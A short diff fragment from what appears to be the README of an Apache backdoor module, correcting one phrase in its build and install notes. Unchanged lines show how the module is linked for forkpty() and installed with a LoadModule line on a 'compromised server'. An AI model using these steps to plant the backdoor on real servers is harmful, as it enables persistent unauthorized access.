@@ -25,7 +25,7 @@ For developpement :<br/>
  -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
 * `systemctl restart apache2`
 
-On compromised server :<br/>
+On a compromised server :<br/>
 * Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
 * Create `/etc/apache2/mod-available/backdoor.load` with content:<br/>
  `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
